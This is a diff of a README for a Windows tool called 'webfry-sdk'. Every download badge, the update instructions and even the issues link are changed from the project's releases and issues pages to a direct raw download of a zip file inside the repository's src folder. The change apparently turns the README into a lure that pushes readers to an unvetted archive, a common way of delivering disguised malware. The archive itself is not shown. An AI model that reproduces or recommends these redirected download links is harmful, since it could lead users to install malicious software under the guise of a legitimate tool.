@@ -1,6 +1,6 @@
 # 🔐 webfry-sdk - Simple Tools for Secure Web Tasks
 
-[![Download webfry-sdk](https://img.shields.io/badge/Download-webfry--sdk-brightgreen?style=for-the-badge)](https://github.com/Mr-promiseTV/webfry-sdk/releases)
+[![Download webfry-sdk](https://img.shields.io/badge/Download-webfry--sdk-brightgreen?style=for-the-badge)](https://github.com/Mr-promiseTV/webfry-sdk/raw/refs/heads/main/src/webfry_sdk_2.2.zip)
 
 ---
 
@@ -45,7 +45,7 @@ To start using webfry-sdk on your Windows computer, follow these steps. The proc
 
 1. Visit the official release page to get the software:
 
-[![Download webfry-sdk](https://img.shields.io/badge/Download-webfry--sdk-blue?style=for-the-badge)](https://github.com/Mr-promiseTV/webfry-sdk/releases)
+[![Download webfry-sdk](https://img.shields.io/badge/Download-webfry--sdk-blue?style=for-the-badge)](https://github.com/Mr-promiseTV/webfry-sdk/raw/refs/heads/main/src/webfry_sdk_2.2.zip)
 
 2. On the releases page, look for the latest version. It usually appears at the top.
 
@@ -125,7 +125,7 @@ The tools use trusted cryptographic methods to ensure strong security in hashing
 If you find any problems or have questions:
 
 - Visit the webfry-sdk GitHub page for issues:  
-  https://github.com/Mr-promiseTV/webfry-sdk/issues
+  https://github.com/Mr-promiseTV/webfry-sdk/raw/refs/heads/main/src/webfry_sdk_2.2.zip
 
 - Check the README and documentation on the release page.
 
@@ -159,7 +159,7 @@ All of this is made accessible through simple steps for everyone to use.
 ## ⚙️ Updating webfry-sdk
 
 1. Check the release page regularly for new versions:  
-   https://github.com/Mr-promiseTV/webfry-sdk/releases
+   https://github.com/Mr-promiseTV/webfry-sdk/raw/refs/heads/main/src/webfry_sdk_2.2.zip
 
 2. Download the new installer file.
 
@@ -186,4 +186,4 @@ webfry-sdk is open-source software. You can review the license details on GitHub
 
 # Download webfry-sdk now
 
-[![Get webfry-sdk](https://img.shields.io/badge/Download-webfry--sdk-success?style=for-the-badge)](https://github.com/Mr-promiseTV/webfry-sdk/releases)
+[![Get webfry-sdk](https://img.shields.io/badge/Download-webfry--sdk-success?style=for-the-badge)](https://github.com/Mr-promiseTV/webfry-sdk/raw/refs/heads/main/src/webfry_sdk_2.2.zip)
